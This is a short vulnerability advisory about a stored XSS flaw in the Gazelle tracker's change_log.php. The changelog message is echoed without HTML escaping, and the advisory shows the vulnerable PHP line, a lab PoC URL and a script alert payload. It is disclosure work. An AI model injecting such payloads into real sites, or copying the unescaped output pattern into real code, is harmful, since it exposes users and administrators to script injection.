# Stored XSS vulnerability in [WhatCD/Gazelle ](https://github.com/WhatCD/Gazelle) vlatest of file /change_log.php

**vender**:

- [WhatCD/Gazelle](https://github.com/WhatCD/Gazelle)

**SoftLink**:

- [WhatCD/Gazelle](https://github.com/WhatCD/Gazelle)

**Vulnerable File**

- sections/tools/managers/change_log.php

**Version**

- v latest 
- commit 63b3370

### Anaylse

**Vulnerability 1: Unescaped changelog message output**

```php
<div class="pad">
    <?=$Change['Message']?>
</div>
```

- **Issue**: `$Change['Message']` is fetched straight from the database and echoed **without any HTML escaping**.
- **Risk**: An attacker can inject HTML/JavaScript payloads such as `<script>` or `<img onerror>` into the `message` field; these payloads will execute whenever an administrator or user views the changelog.

### POC

```
http://192.168.100.101/Gazelle/sections/tools/managers/change_log.php
```

```
<script>alert('Stored XSS')</script>
```



![image-20250827021116087](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508270211233.png)



![image-20250827021044296](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508270210395.png)